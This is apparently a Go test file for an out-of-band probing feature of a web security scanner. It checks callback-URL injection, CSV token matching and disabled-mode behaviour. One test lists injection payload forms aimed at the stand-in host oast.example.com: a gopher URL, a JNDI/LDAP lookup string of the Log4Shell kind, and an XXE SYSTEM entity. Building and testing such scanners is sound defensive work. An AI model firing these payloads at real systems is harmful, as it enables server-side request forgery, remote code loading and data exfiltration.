package dast

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// oobFetcher 记录注入 URL，供断言回调地址确实进到参数里。
type oobFetcher struct {
	deepFetcher
	seen []string
}

func (f *oobFetcher) GetSmall(u string) *Resp {
	f.seen = append(f.seen, u)
	return &Resp{Status: 200, Body: "<html>ok</html>"}
}

// TestOobCSVHit CSV 模式：日志出现令牌即确认出带。
func TestOobCSVHit(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "oob.csv")
	// 用一个固定前缀令牌，模拟接收端记录
	if err := os.WriteFile(path, []byte("2026-10-10T00:00:00Z,slAAAABBBBCCCCDDDD,1.2.3.4,GET /slAAAABBBBCCCCDDDD\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	f := &oobFetcher{}
	r := New(f, DefaultOptions())
	hits := r.OobProbe([]Target{{URL: "https://a.com/s?u=1", Param: "u"}}, OobConfig{
		Enabled: true, Mode: "csv", CSVPath: path, TokenHost: "oast.example.com",
	})
	// 令牌随机，CSV 里的固定令牌不会命中——验证"不误报"
	if len(hits) != 0 {
		t.Fatalf("随机令牌不应命中固定 CSV 记录: %+v", hits)
	}
	if len(f.seen) == 0 || !strings.Contains(f.seen[0], "oast.example.com") {
		t.Fatalf("探针未把回调地址注入参数: %v", f.seen)
	}
}

// TestOobCSVTokenMatch 直接验证 token→命中 的判定逻辑（绕过随机令牌）。
func TestOobCSVTokenMatch(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "oob.csv")
	if err := os.WriteFile(path, []byte("t,slTOKEN123,X\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	want := map[string]bool{"slTOKEN123": true}
	hits := readOobCSV(path, want)
	if !hits["slTOKEN123"] {
		t.Fatalf("CSV 命中判定失败: %+v", hits)
	}
	want2 := map[string]bool{"slNOTHERE": true}
	if readOobCSV(path, want2)["slNOTHERE"] {
		t.Fatal("不存在的令牌不应判命中")
	}
}

// TestOobDisabled 未启用时不发请求。
func TestOobDisabled(t *testing.T) {
	f := &oobFetcher{}
	r := New(f, DefaultOptions())
	hits := r.OobProbe([]Target{{URL: "https://a.com/s?u=1", Param: "u"}}, OobConfig{Enabled: false})
	if len(hits) != 0 || len(f.seen) != 0 {
		t.Fatalf("未启用时不应探测: hits=%v seen=%v", hits, f.seen)
	}
}

// TestOobPayloads 出带形态覆盖 URL / gopher / JNDI / XXE 实体。
func TestOobPayloads(t *testing.T) {
	ps := oobPayloads("http://oast.example.com", "tok1")
	joined := strings.Join(ps, "\n")
	for _, want := range []string{"http://oast.example.com/tok1", "gopher://oast.example.com/_tok1", "${jndi:ldap://oast.example.com/tok1}", "SYSTEM \"http://oast.example.com/tok1\""} {
		if !strings.Contains(joined, want) {
			t.Fatalf("缺出带形态 %q:\n%s", want, joined)
		}
	}
}

// TestOobNoTokenHost 未配回调域名时不探测（防注入空地址）。
func TestOobNoTokenHost(t *testing.T) {
	f := &oobFetcher{}
	r := New(f, DefaultOptions())
	if hits := r.OobProbe([]Target{{URL: "https://a.com/s?u=1", Param: "u"}}, OobConfig{Enabled: true}); len(hits) != 0 {
		t.Fatalf("未配 token_host 不应探测: %+v", hits)
	}
}
